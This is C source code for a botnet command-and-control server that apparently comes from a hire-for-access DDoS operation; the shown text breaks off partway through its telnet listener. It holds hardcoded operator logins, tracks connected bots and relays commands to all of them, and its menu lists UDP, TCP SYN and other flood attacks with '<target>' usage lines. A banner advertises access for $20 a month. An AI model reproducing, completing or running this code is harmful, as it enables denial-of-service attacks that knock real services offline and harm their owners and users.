#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
 
#define MY_MGM_CLEVERP "clever"
#define MY_MGM_CLEVERU "clever"
#define MY_MGM_KFCP "scribs"
#define MY_MGM_KFCU "scribs"
#define MY_MGM_ADMINP "annie"
#define MY_MGM_ADMINU "annie"
#define MY_MGM_BLEACHP "bag"
#define MY_MGM_BLEACHU "scum"
#define MY_MGM_SHITTYP "Cunts"
#define MY_MGM_SHITTYU "Shittys"
#define MY_MGM_USERP "drinkbleachs"
#define MY_MGM_USERU "users"
#define MY_MGM_SKIDP "Runs"
#define MY_MGM_SKIDU "Skids"
#define MY_MGM_GUESTP "shrekislyfes"
#define MY_MGM_GUESTU "guests"
#define MY_MGM_PORT 9704

#define MAXFDS 1000000 // No way we actually reach this amount. Ever.
int CLEVER=0, ADMIN=0, KFC=0, BLEACH=0, SHITTY=0, GUEST=0, SKID=0, USER=0;
 
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str) // Remove whitespace from a string and properly null-terminate it.
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{ // man fcntl
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        /*
              F_SETFL (int)
              Set  the  file  status  flags  to  the  value specified by arg.  File access mode (O_RDONLY, O_WRONLY, O_RDWR) and file creation flags (i.e., O_CREAT, O_EXCL, O_NOCTTY, O_TRUNC) in arg are
              ignored.  On Linux this command can change only the O_APPEND, O_ASYNC, O_DIRECT, O_NOATIME, and O_NONBLOCK flags.
        */
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, int managementcmd) // sends message to all , notifies the management clients of this happening
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0; // Don't send pings to management. Why? Because a human is going to ignore it.
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                                if(managementcmd == 1){
                                        if(sendMGM && managements[i].connected)
                                        {
                                                        if(us == CLEVER){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Clever:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == ADMIN){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Owner:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == BLEACH){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Scumbag:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == KFC){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Scribs:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == SHITTY){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Shitty:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == USER){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "User:\x1b[38;5;188m ", 18, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == SKID){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Instru:\x1b[38;5;188m ", 18, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                                        else if(us == GUEST){
                                                                send(i, "\x1b[38;5;55m", 11, MSG_NOSIGNAL);
                                                                send(i, "Guest:\x1b[38;5;188m ", 19, MSG_NOSIGNAL);
                                                                printf("sent to fd: %d\n", i);
                                                                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                                                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m-> \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                                                else send(i, "\n", 1, MSG_NOSIGNAL);
                                                        }
                                        }
                                }
                                else{
                                        printf("sent to fd: %d\n", i);
                                        send(i, msg, strlen(msg), MSG_NOSIGNAL);
                                        if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[38;5;129m~$ \x1b[38;5;15m", 26, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                                        else send(i, "\n", 1, MSG_NOSIGNAL);
                                }
        }
        free(wot);
}

void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len); // accept a connection from a bot.
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                                printf("dup client\n"); // warns the operator on command line
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; } // orders all the bots to immediately kill themselves if we see a duplicate client! MAXIMUM PARANOIA
                                                if(send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) { close(infd); continue; } // same thing as above.
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                        if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        if(send(thefd, "PING\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected() // counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}
 
int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}
void *titleWriter(void *sock) // just an informational banner
{
        // this LOOKS vulnerable, but it's actually not.
        // there's no way we can have 2000 digits' worth of clients/bots connected to overflow that char array        
                int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Slaves connected: %d || RGH Net || Kings connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
                // \007 is a bell character... causes a beep. Why is there a beep here?
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(2);
        }
}
void *telnetWorker(void *sock)
{
            int thefd = (int)sock;
        managesConnected++;
        pthread_t title;
        char buf[2048];
                char* nickstring;
        memset(buf, 0, sizeof buf);
                
        if(send(thefd, "\x1b[39mUsername:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
                nickstring = ("%s", buf);
                if(strcmp(nickstring, MY_MGM_CLEVERU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_CLEVERP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        CLEVER = thefd;
                        if(CLEVER == ADMIN){
                                ADMIN = 0;
                        }
                        else if(CLEVER == BLEACH){
                                BLEACH = 0;
                        }
                        else if(CLEVER == KFC){
                                KFC = 0;
                        }
                        else if(CLEVER == SHITTY){
                        
                                SHITTY = 0;
                        }
                        else if(CLEVER == USER){
                        
                                USER = 0;
                        }
                        else if(CLEVER == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(CLEVER == SKID){
                        
                                SKID = 0;
                        }                       
                        goto fak;
                }
                if(strcmp(nickstring, MY_MGM_SHITTYU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_SHITTYP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        SHITTY = thefd;
                        if(SHITTY == ADMIN){
                                ADMIN = 0;
                        }
                        else if(SHITTY == BLEACH){
                                BLEACH = 0;
                        }
                        else if(SHITTY == KFC){
                                KFC = 0;
                        }
                        else if(SHITTY == CLEVER){
                                CLEVER = 0;
                        }
                        else if(SHITTY == USER){
                        
                                USER = 0;
                        }
                        else if(SHITTY == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(SHITTY == SKID){
                        
                                SKID = 0;
                        }                       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_ADMINU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_ADMINP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        ADMIN = thefd;
                        if(ADMIN == CLEVER){
                                CLEVER = 0;
                        }
                        else if(ADMIN == BLEACH){
                                BLEACH = 0;
                        }
                        else if(ADMIN == KFC){
                                KFC = 0;
                        }
                        else if(ADMIN == SHITTY){
                                SHITTY = 0;
                        }
                        else if(ADMIN == USER){
                        
                                USER = 0;
                        }
                        else if(ADMIN == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(ADMIN == SKID){
                        
                                SKID = 0;
                        }       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_KFCU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_KFCP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        KFC = thefd;
                        if(KFC == ADMIN){
                                ADMIN = 0;
                        }
                        else if(KFC == BLEACH){
                                BLEACH = 0;
                        }
                        else if(KFC == CLEVER){
                                CLEVER = 0;
                        }
                        else if(KFC == SHITTY){
                                SHITTY = 0;
                        }
                        else if(KFC == USER){
                        
                                USER = 0;
                        }
                        else if(KFC == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(KFC == SKID){
                        
                                SKID = 0;
                        }       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_BLEACHU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_BLEACHP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        BLEACH = thefd;
                        if(BLEACH == ADMIN){
                                ADMIN = 0;
                        }
                        else if(BLEACH == CLEVER){
                                CLEVER = 0;
                        }
                        else if(BLEACH == KFC){
                                KFC = 0;
                        }
                        else if(BLEACH == SHITTY){
                                SHITTY = 0;
                        }
                        else if(BLEACH == USER){
                        
                                USER = 0;
                        }
                        else if(BLEACH == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(BLEACH == SKID){
                        
                                SKID = 0;
                        }       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_USERU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_USERP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        USER = thefd;
                        if(USER == ADMIN){
                                ADMIN = 0;
                        }
                        else if(USER == CLEVER){
                                CLEVER = 0;
                        }
                        else if(USER == KFC){
                                KFC = 0;
                        }
                        else if(USER == SHITTY){
                                SHITTY = 0;
                        }
                        else if(USER == BLEACH){
                        
                                BLEACH = 0;
                        }
                        else if(USER == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(USER == SKID){
                        
                                SKID = 0;
                        }       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_GUESTU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_GUESTP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        GUEST = thefd;
                        if(GUEST == ADMIN){
                                ADMIN = 0;
                        }
                        else if(GUEST == CLEVER){
                                CLEVER = 0;
                        }
                        else if(GUEST == KFC){
                                KFC = 0;
                        }
                        else if(GUEST == SHITTY){
                                SHITTY = 0;
                        }
                        else if(GUEST == USER){
                        
                                USER = 0;
                        }
                        else if(GUEST == BLEACH){
                        
                                BLEACH = 0;
                        }
                        else if(GUEST == SKID){
                        
                                SKID = 0;
                        }       
                        goto fak;
                }
                else if(strcmp(nickstring, MY_MGM_SKIDU) == 0){
                        if(send(thefd, "\x1b[39mPassword:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
                        trim(buf);
                        if(strcmp(buf, MY_MGM_SKIDP) != 0) goto failed;
                        memset(buf, 0, 2048);
                        SKID = thefd;
                        if(SKID == ADMIN){
                                ADMIN = 0;
                        }
                        else if(SKID == CLEVER){
                                CLEVER = 0;
                        }
                        else if(SKID == KFC){
                                KFC = 0;
                        }
                        else if(SKID == SHITTY){
                                SHITTY = 0;
                        }
                        else if(SKID == USER){
                        
                                USER = 0;
                        }
                        else if(SKID == GUEST){
                        
                                GUEST = 0;
                        }
                        else if(SKID == BLEACH){
                        
                                BLEACH= 0;
                        }       
                        goto fak;
                }

                else if(strcmp(nickstring, MY_MGM_BLEACHU) != 0|| strcmp(nickstring, MY_MGM_CLEVERU) != 0 || strcmp(nickstring, MY_MGM_ADMINU) != 0 || strcmp(nickstring, MY_MGM_KFCU) != 0 || strcmp(nickstring, MY_MGM_USERU) != 0 || strcmp(nickstring, MY_MGM_GUESTU) != 0|| strcmp(nickstring, MY_MGM_SKIDU) != 0){
                        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
                        if(send(thefd, "\033[H\033[J\x1b[39mAcces denied\r\n", 32, MSG_NOSIGNAL) == -1) goto end;
                        goto end;
                }
                failed:
                        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
                        if(send(thefd, "\033[H\033[J\x1b[39mAcces denied\r\n", 32, MSG_NOSIGNAL) == -1) goto end;
                        goto end;
fak:
       if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); /* writes the informational banner to the admin after a login */
                if(send(thefd, "*             \x1b[31mWelcum 2 da Slammer\x1b[30m     *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;                if(send(thefd, "\x1b[1m\x1b[30m****************************************\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*              \x1b[31mOwner:Juhggin/Digi\x1b[30m     *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*               \x1b[31m$20 A Month\x1b[30m           *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*             \x1b[31mShare=Banned Skid\x1b[30m       *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*            \x1b[31mDONT SPAM NET\x1b[30m            *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*              \x1b[Get Ran Skid\x1b[30m              *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "*         \x1b[36mMade By: Digi/Xqfs\x1b[30m          *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "****************************************\r\n\r\n\x1b[30m> \x1b[37m", 59, MSG_NOSIGNAL) == -1) goto end;				
        /* If we can't send the useless banner, kill ourselves! Amazing error handling! */
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
                trim(buf);
                if(strncmp(buf, "BOTS", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "BOTS ONLINE: %d\r\n", clientsConnected());
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "USERS", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "USERS ONLINE: %d\r\n", managesConnected);
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "HELP", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "UDP, KILL, BOTS, USERS, CLEAR, HELP, INFO, \r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "UDP", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "Usage: !* UDP <target> 80 <time> 32 0 10\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
				}
                if(strncmp(buf, "INFO", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "\x1b[36mInstagram: Rgh.Falcons\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "TCP", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "Usage: !* TCP <target> 80 <time> 32 syn 0 10\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "HOLD", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "Usage: !* HOLD <target> 80 <time>\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "JUNK", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "Usage: !* JUNK <target> 80 <time>\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }   
                if(strncmp(buf, "KILL", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "Usage: !* KILLATTK\r\n");
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf); 
                }
                if(strncmp(buf, "STOP", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    broadcast("!* STOP", thefd, 0);
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(strncmp(buf, "CLEAR", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    goto fak;
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    memset(buf, 0, 2048);
                    printf("management: \"%s\"\n", buf);
                }
                if(send(thefd, "\x1b[38;5;129m> \x1b[38;5;15m", 24, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                char* falsejuan = ">- oohkillem69";
                char* realjuan = "!* OHKILLEM";
                char* realljuan = "! OHKILLEM";
                char* falsetu = ">- turndatsheitawf";
                char* realtu = "!* SCANNER OFF";
                char* realltu = "! SCANNER OFF";
                char* nosh4u = "! SH";
                char* nosh4u2 = "!* SH";
                if(strstr(buf, "! ") != NULL || strstr(buf, "!* ") != NULL || strstr(buf, ">- ") != NULL){
                    if(strcmp(buf, falsejuan) == 0){
                        broadcast(realjuan, thefd, 0);
                        memset(buf, 0, 2048);
                    }
                    else if(strcmp(buf, falsetu) == 0){
                        broadcast(realtu, thefd, 0);
                        memset(buf, 0, 2048);
                    }
                    else if(strcmp(buf, realjuan) == 0 || strcmp(buf, realtu) ==0 || strcmp(buf, realljuan) == 0 || strcmp(buf, realltu) == 0){
                        goto end;
                    }
                    else {
                        broadcast(buf, thefd, 0);
                        memset(buf, 0, 2048);
                    }
                }
                else{
                    broadcast(buf, thefd, 1); // take a command, send it to the bots
                    memset(buf, 0, 2048);
                }
        }
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(void *useless)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
